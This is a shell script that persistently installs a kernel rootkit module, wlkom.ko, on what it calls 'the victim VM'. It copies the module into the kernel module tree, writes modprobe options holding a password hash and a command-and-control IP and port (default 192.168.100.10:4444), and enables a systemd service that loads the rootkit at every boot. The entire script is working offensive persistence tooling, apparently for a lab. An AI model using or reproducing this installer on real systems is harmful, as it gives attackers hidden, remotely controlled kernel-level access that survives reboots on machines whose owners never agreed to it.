#!/bin/sh
# Install wlkom.ko persistently on the victim VM.
# Usage: sudo ./install_persistence.sh <password_hash> [c2_ip] [c2_port]

set -eu

usage() {
    echo "Usage: sudo $0 <password_hash> [c2_ip] [c2_port]" >&2
    echo "Example: sudo $0 afd071e5 192.168.100.10 4444" >&2
}

if [ "${1:-}" = "" ]; then
    usage
    exit 1
fi

if [ "$(id -u)" -ne 0 ]; then
    echo "This installer must run as root." >&2
    exit 1
fi

PASSWORD_HASH="$1"
C2_IP="${2:-192.168.100.10}"
C2_PORT="${3:-4444}"
KERNEL_VERSION="$(uname -r)"
MODULE_SRC="./wlkom.ko"
MODULE_DST_DIR="/lib/modules/$KERNEL_VERSION/extra"
MODULE_DST="$MODULE_DST_DIR/wlkom.ko"
MODPROBE_CONF="/etc/modprobe.d/wlkom.conf"
SERVICE_FILE="/etc/systemd/system/wlkom.service"

case "$PASSWORD_HASH" in
    ????????) ;;
    *)
        echo "password_hash must be an 8-character FNV-1a hex value." >&2
        exit 1
        ;;
esac

case "$PASSWORD_HASH" in
    *[!0123456789abcdefABCDEF]*)
        echo "password_hash must contain only hexadecimal characters." >&2
        exit 1
        ;;
esac

if [ ! -f "$MODULE_SRC" ]; then
    echo "Missing $MODULE_SRC. Run make in the rootkit directory first." >&2
    exit 1
fi

install -d "$MODULE_DST_DIR"
install -m 0644 "$MODULE_SRC" "$MODULE_DST"
depmod -a

cat > "$MODPROBE_CONF" <<EOF
options wlkom password_hash=$PASSWORD_HASH c2_ip=$C2_IP c2_port=$C2_PORT
EOF

cat > "$SERVICE_FILE" <<'EOF'
[Unit]
Description=WLKOM kernel module
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe wlkom
ExecStop=/sbin/modprobe -r wlkom
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable wlkom.service

echo "WLKOM persistence installed for kernel $KERNEL_VERSION."
echo "Module: $MODULE_DST"
echo "Config: $MODPROBE_CONF"
echo "Service: $SERVICE_FILE"
echo "Start now with: sudo systemctl start wlkom.service"
